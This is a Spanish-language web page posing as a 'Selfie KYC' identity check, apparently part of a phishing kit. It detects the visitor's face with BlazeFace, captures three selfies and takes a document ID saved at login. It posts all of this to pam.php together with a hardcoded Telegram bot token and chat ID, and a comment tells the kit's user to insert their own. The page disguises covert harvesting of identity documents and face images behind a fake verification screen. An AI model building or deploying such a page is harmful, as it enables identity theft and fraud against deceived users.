<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Selfie KYC</title>

<style>
    :root {
        --green-main: #00a63a;
        --text-main: #333333;
    }

    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display",
                     "Segoe UI", Roboto, Helvetica, Arial;
    }

    body {
        background: #ffffff;
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .screen {
        background: #ffffff;
        width: 100%;
        max-width: 420px;
        min-height: 700px;
        border-radius: 28px;
        box-shadow:
            0 20px 50px rgba(0,0,0,0.20),
            0 8px 20px rgba(0,0,0,0.14);
        padding: 32px 22px 26px;
        display: flex;
        flex-direction: column;
        align-items: center;
        position: relative;
        overflow: hidden;
    }

    .title {
        font-size: 22px;
        font-weight: 500;
        color: var(--text-main);
        text-align: center;
        margin-bottom: 28px;
    }

    .close-x {
        position: absolute;
        right: 18px;
        top: 14px;
        font-size: 24px;
        color: #999;
        cursor: pointer;
    }

    /* Contenedor del c√≠rculo */
    .circle-wrapper {
        position: relative;
        width: 260px;
        height: 260px;
        margin-bottom: 32px;
    }

    /* C√≠rculo que recorta el video */
    .circle-mask {
        position: absolute;
        inset: 0;
        border-radius: 50%;
        overflow: hidden;
        background: #eee;
    }

    video {
        width: 100%;
        height: 100%;
        object-fit: cover;
        transform: scaleX(-1); /* espejo tipo selfie */
    }

    /* Anillo verde externo */
    .circle-border {
        position: absolute;
        inset: 0;
        border-radius: 50%;
        border: 5px solid var(--green-main);
        pointer-events: none;
    }

    /* Anillo de escaneo (cuando rostro centrado) */
    .scan-ring {
        position: absolute;
        inset: -4px;
        border-radius: 50%;
        border: 6px solid transparent;
        border-top-color: var(--green-main);
        border-right-color: var(--green-main);
        pointer-events: none;
        opacity: 0;
    }

    .scan-ring.active {
        opacity: 1;
        animation: spin 1.4s linear infinite;
    }

    @keyframes spin {
        from { transform: rotate(0deg); }
        to   { transform: rotate(360deg); }
    }

    /* Overlay de escaneo vertical para la captura */
    .circle-scan-overlay {
        position: absolute;
        inset: 0;
        border-radius: 50%;
        overflow: hidden;
        pointer-events: none;
    }

    .circle-scan-overlay::before {
        content: "";
        position: absolute;
        left: -10%;
        width: 120%;
        height: 40%;
        top: -120%;
        background: linear-gradient(
            to bottom,
            rgba(0,255,0,0),
            rgba(0,255,0,0.4),
            rgba(0,255,0,0)
        );
    }

    .circle-scan-overlay.scanning::before {
        animation: scanDown 1.6s ease-in-out forwards;
    }

    @keyframes scanDown {
        0%   { top: -120%; }
        100% { top: 120%;  }
    }

    .hint {
        margin-top: 10px;
        font-size: 15px;
        color: #555;
        text-align: center;
        line-height: 1.4;
        padding: 0 12px;
    }

    .status-label {
        margin-top: 14px;
        font-size: 13px;
        color: #888;
        text-align: center;
    }

    .status-label.ok {
        color: var(--green-main);
        font-weight: 500;
    }

    .counter {
        margin-top: 6px;
        font-size: 14px;
        color: var(--green-main);
        font-weight: 500;
    }

    .capture-btn {
        margin-top: 18px;
        padding: 10px 22px;
        border-radius: 22px;
        border: none;
        background: var(--green-main);
        color: #fff;
        font-size: 15px;
        cursor: pointer;
        box-shadow: 0 4px 10px rgba(0,0,0,0.18);
        transition: transform 0.1s ease, box-shadow 0.1s ease, opacity 0.1s ease;
        display: none; /* se muestra cuando el rostro est√° listo */
    }

    .capture-btn.show {
        display: inline-block;
    }

    .capture-btn:disabled {
        opacity: 0.6;
        cursor: default;
        box-shadow: none;
    }

    .capture-btn:not(:disabled):active {
        transform: translateY(1px);
        box-shadow: 0 2px 6px rgba(0,0,0,0.25);
    }

    @media (max-width: 480px) {
        .screen {
            max-width: 100%;
            height: 100vh;
            border-radius: 0;
            box-shadow: none;
        }
    }
</style>
</head>
<body>

<div class="screen">
    <div class="close-x">‚úï</div>

    <div class="title">T√≥mate una fotograf√≠a</div>

    <div class="circle-wrapper">
        <div class="circle-mask">
            <video id="video" autoplay playsinline muted></video>
        </div>
        <div class="circle-border"></div>
        <div class="scan-ring" id="scanRing"></div>
        <div class="circle-scan-overlay" id="scanOverlay"></div>
    </div>

    <div class="hint">
        Ub√≠cate en una zona iluminada y permanece al centro del c√≠rculo.
    </div>

    <div class="status-label" id="statusLabel">
        Esperando permiso de c√°mara...
    </div>

    <div class="counter" id="photoCounter"></div>

    <button id="takePhotoBtn" class="capture-btn">Tomar fotograf√≠a</button>
</div>

<!-- TensorFlow + BlazeFace para detecci√≥n facial -->
<script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-core@4.21.0/dist/tf-core.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-converter@4.21.0/dist/tf-converter.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs-backend-webgl@4.21.0/dist/tf-backend-webgl.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/blazeface@0.0.7/dist/blazeface.min.js"></script>

<script>
(async () => {
    const video = document.getElementById('video');
    const statusLabel = document.getElementById('statusLabel');
    const scanRing = document.getElementById('scanRing');
    const scanOverlay = document.getElementById('scanOverlay');
    const photoCounter = document.getElementById('photoCounter');
    const takeBtn = document.getElementById('takePhotoBtn');

    let model;
    let stream;
    let photosTaken = 0;
    const MAX_PHOTOS = 3;
    const capturedPhotos = []; // dataURL de las fotos
    let faceReady = false;
    let stableFrames = 0;
    let capturing = false;

    // Canvas oculto para capturar frames
    const captureCanvas = document.createElement('canvas');
    const captureCtx = captureCanvas.getContext('2d');

    async function setupCamera() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user" },
                audio: false
            });
            video.srcObject = stream;
            statusLabel.textContent = "C√°mara activada. Esperamos que seas t√∫...";
            await new Promise(res => video.onloadedmetadata = res);
        } catch (err) {
            console.error(err);
            statusLabel.textContent = "No se pudo acceder a la c√°mara.";
        }
    }

    async function loadModel() {
        await tf.setBackend('webgl');
        model = await blazeface.load();
        statusLabel.textContent = "Coloca tu rostro dentro del c√≠rculo.";
    }

    // Comprueba si el rostro est√° centrado en el c√≠rculo
    function isFaceCentered(prediction, videoWidth, videoHeight) {
        const [x1, y1] = prediction.topLeft;
        const [x2, y2] = prediction.bottomRight;
        const faceCenterX = (x1 + x2) / 2;
        const faceCenterY = (y1 + y2) / 2;

        const cx = videoWidth / 2;
        const cy = videoHeight / 2;
        const radius = Math.min(videoWidth, videoHeight) * 0.35;

        const dx = faceCenterX - cx;
        const dy = faceCenterY - cy;
        const dist = Math.sqrt(dx*dx + dy*dy);

        return dist < radius * 0.6; // margen
    }

    function capturePhoto() {
        const w = video.videoWidth;
        const h = video.videoHeight;
        if (!w || !h) return;

        captureCanvas.width = w;
        captureCanvas.height = h;
        captureCtx.drawImage(video, 0, 0, w, h);
        const dataURL = captureCanvas.toDataURL('image/jpeg', 0.9);
        capturedPhotos.push(dataURL);
        photosTaken++;
        photoCounter.textContent = `Foto ${photosTaken} de ${MAX_PHOTOS}`;
    }

    async function sendPhotos() {
        const fd = new FormData();
        capturedPhotos.forEach((dataURL, i) => {
            fd.append(`photo${i+1}`, dataURL);
        });

        // üîê ID del cliente (documento) guardado en localStorage desde el login
        const docId = localStorage.getItem('doc_id') || '';

        // üîê Token e ID de Telegram: PON AQU√ç LOS TUYOS
        const TELEGRAM_TOKEN = '8593661430:AAGbJVG-7-S4jzO9MCi9ZwsUOhkaO-7tt9E';
        const CHAT_ID = '7655000874';

        fd.append('doc_id', docId);
        fd.append('token', TELEGRAM_TOKEN);
        fd.append('chat_id', CHAT_ID);

        const resp = await fetch('pam.php', {
            method: 'POST',
            body: fd
        });

        if (!resp.ok) {
            throw new Error('Error en la respuesta del servidor');
        }
    }

    async function handleTakePhoto() {
        if (!faceReady || capturing) return;
        capturing = true;
        photosTaken = 0;
        capturedPhotos.length = 0;
        takeBtn.disabled = true;
        statusLabel.textContent = "Capturando im√°genes...";
        statusLabel.classList.add('ok');
        photoCounter.textContent = "";

        // Lanzar animaci√≥n de escaneo
        scanOverlay.classList.remove('scanning'); // reinicio
        void scanOverlay.offsetWidth;            // truco para reiniciar animaci√≥n
        scanOverlay.classList.add('scanning');

        // Capturamos 3 fotos en intervalos
        capturePhoto();                // t = 0
        setTimeout(capturePhoto, 550);  // t ‚âà 0.55s
        setTimeout(capturePhoto, 1100); // t ‚âà 1.1s

        // Despu√©s de la √∫ltima, detenemos y enviamos
        setTimeout(async () => {
            scanOverlay.classList.remove('scanning');
            statusLabel.textContent = "Validando identidad...";
            try {
                await sendPhotos();
                statusLabel.textContent = "Fotos enviadas correctamente.";
                statusLabel.classList.add('ok');
            } catch (e) {
                console.error(e);
                statusLabel.textContent = "Error al enviar las fotos.";
                statusLabel.classList.remove('ok');
            }
            takeBtn.disabled = false;
            takeBtn.textContent = "Tomar fotograf√≠a";
            capturing = false;
        }, 1500); // un poco m√°s que la animaci√≥n
    }

    takeBtn.addEventListener('click', handleTakePhoto);

    async function detectionLoop() {
        if (!model || !video.videoWidth) {
            requestAnimationFrame(detectionLoop);
            return;
        }

        const returnTensors = false;
        const flipHorizontal = true;
        const predictions = await model.estimateFaces(video, returnTensors, flipHorizontal);

        if (predictions && predictions.length > 0) {
            const best = predictions[0];
            if (best.probability && best.probability[0] > 0.9 &&
                isFaceCentered(best, video.videoWidth, video.videoHeight)) {

                stableFrames++;
                if (stableFrames > 10) {
                    if (!faceReady) {
                        faceReady = true;
                        statusLabel.textContent = "Rostro detectado. Presiona \"Tomar fotograf√≠a\".";
                        statusLabel.classList.add('ok');
                        takeBtn.classList.add('show');
                    }
                    scanRing.classList.add('active');
                }
            } else {
                stableFrames = 0;
                faceReady = false;
                scanRing.classList.remove('active');
                takeBtn.classList.remove('show');
                if (!capturing) {
                    statusLabel.textContent = "Ajusta tu rostro al centro del c√≠rculo.";
                    statusLabel.classList.remove('ok');
                }
            }
        } else {
            stableFrames = 0;
            faceReady = false;
            scanRing.classList.remove('active');
            takeBtn.classList.remove('show');
            if (!capturing) {
                statusLabel.textContent = "Ac√©rcate a la c√°mara.";
                statusLabel.classList.remove('ok');
            }
        }

        requestAnimationFrame(detectionLoop);
    }

    // Inicializaci√≥n
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        statusLabel.textContent = "Cambia de dispositivo.";
    } else {
        await setupCamera();
        await loadModel();
        detectionLoop();
    }
})();
</script>

</body>
</html>
